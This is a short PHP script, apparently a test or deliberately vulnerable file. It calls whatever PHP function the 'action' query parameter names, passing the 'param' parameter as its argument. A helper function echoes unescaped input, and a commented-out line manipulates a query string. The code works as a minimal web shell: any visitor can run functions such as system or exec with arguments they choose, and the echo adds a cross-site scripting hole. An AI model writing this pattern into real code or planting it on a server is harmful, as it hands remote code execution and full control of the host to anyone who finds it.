<?php

function dha($param1)
{
echo $param1;
}

if(isset($_GET['action'])){
    if(function_exists($_GET['action'])) {    
        $_GET['action']($_GET['param']);
    }
}


// $x = str_replace("print(", "", str_replace(");", "", $_GET['q']));
// echo $x;